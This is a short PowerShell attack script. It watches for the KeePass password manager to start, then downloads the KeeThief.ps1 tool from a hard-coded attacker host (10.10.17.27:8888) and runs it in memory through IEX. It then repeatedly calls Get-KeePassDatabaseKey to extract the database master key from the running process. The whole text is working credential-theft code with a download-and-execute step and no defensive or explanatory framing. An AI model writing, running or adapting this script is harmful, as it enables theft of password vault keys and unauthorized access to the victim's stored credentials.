$target = "KeePass"
$process = Get-Process | Where-Object {$_.ProcessName -eq $target}
while ($true)
{
 while (!($process))
 {
  $process = Get-Process | Where-Object {$_.ProcessName -eq $target}
  start-sleep -s 5
 }
 if ($process)
 {
  (new-object system.net.webclient).downloadstring('http://10.10.17.27:8888/Tools/KeeThief/PowerShell/KeeThief.ps1') | IEX
  while ($process)
  {
   start-sleep -s 5
   Get-KeePassDatabaseKey -Verbose
   $process = Get-Process | Where-Object {$_.ProcessName -eq $target}
  }
 }
}
